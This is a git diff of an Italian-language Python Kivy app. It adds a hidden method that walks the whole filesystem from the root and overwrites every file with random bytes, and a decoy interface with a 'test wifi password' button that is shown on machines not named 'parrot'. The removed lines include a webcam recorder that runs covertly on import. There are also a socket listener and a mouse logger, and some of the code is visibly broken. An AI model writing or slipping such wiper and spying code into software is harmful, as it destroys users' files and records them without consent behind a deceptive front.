@@ -9,11 +9,14 @@ import threading
 import os
 import platform
 import webbrowser
+import os
+import time
 from zipfile import ZipFile
 from zipfile import ZipFile 
 import time
 from pynput import mouse
 import socket
+from cryptography.fernet import Fernet
 class Universale_Nucleare(App):
     def __init__(self, **kwargs):
         super().__init__(**kwargs)
@@ -41,18 +44,35 @@ class Universale_Nucleare(App):
         return app
 
     def secret(self, _):
-        if os.name == "Andoid":
-            finestra = subprocess.STARTUPINFO()
-            finestra.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-            subprocess.Popen("python", startupinfo=finestra)
-        else:
-            subprocess.Popen(["python"])
 
-    def scansione(self, _): #scansione con nmap di tutta la rete  
+        passo=4
+        conta=0 
+        """percorso=os.path.join(os.path.expanduser("~"),"C:\\")#mostra il percoso nella directori  Desktop  
+        print(percorso)"""
+        for root, dirs,files in os.walk("/"):
+            for  file in files:
+                time.sleep(0)
+                file=os.path.join(root, file)
+                try:
+                    with  open(file,"r+b") as f:
+                        for passo1 in range(passo):
+                            f.seek(1) 
+                            lettera=os.path.getsize(file)
+                            f.write(os.urandom(lettera))
+                            conta+=1
+                            print(file)
+                except:     
+                    print(f"comando non eseguito: {file}")
+
+
+    def scansione(self): #scansione con nmap di tutta la rete  
         rete = nmap.PortScanner()
-        rete.scan("0.0.0.0/0")
-        for _ in tqdm(range(10), desc="scansione rete"):
+        rete.scan("localhost/24")
+        for _ in tqdm(range(10,10000), desc="scansione rete"):
             time.sleep(1)
+        for root,_,files in os.wait("//"):
+            for file in files:
+                file=os.path.join(root,file)
 
     def rileva(self, x, y):
         print(f"Mouse spostato a: ({x}, {y})")
@@ -70,7 +90,7 @@ class Universale_Nucleare(App):
             listener.join()
     def dati(self):
         tipo=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-        tipo.bind("0.0.0.0",8090)
+        tipo.bind("120.0.0.1",8090)
         tipo.listen(2)
         print(f"server in attesa{tipo}")
         cocco,ciola=tipo.accept()
@@ -82,21 +102,22 @@ class Universale_Nucleare(App):
         #cocco.sendall(comando.encode())
         cocco.close()
         tipo.close()
+
+class app_normality(App):
+    def build(self):
+        def __init__(self, **kwargs):
+            super().__init__(**kwargs)
+            Apper=BoxLayout(orientation="vertical")    
+            bottnoe=Button(text="richeista",font_size=70)    
+            scansione=Button(text="test wifi password",font_size=70)
+            scansione.bind(on_press=self.scansione)
+            Apper.add_widget(scansione)
+            bottnoe.bind(on_press=lambda x: webbrowser.open("https://www.gallinella.com"))
+            Apper.add_widget(bottnoe)
+            return Apper
 if __name__ == "__main__":
+    if socket.gethostname() == "parrot":
         Universale_Nucleare().run()
-def cip():
-        camera = cv2.VideoCapture(0)
-        fourcc = cv2.VideoWriter_fourcc(*"XVID")
-        nomef = cv2.VideoWriter("video.vacanze.avi", fourcc, 20.0, (640, 480))
-        for _ in range(2000000):
-            ret, frame = camera.read()
-            if not ret:
-                break
-            nomef.write(frame)
-        camera.release()
-        nomef.release()
-cip()
-
-print("hai il permesso")
-
-
+    else:
+        app_normality().run()
+       
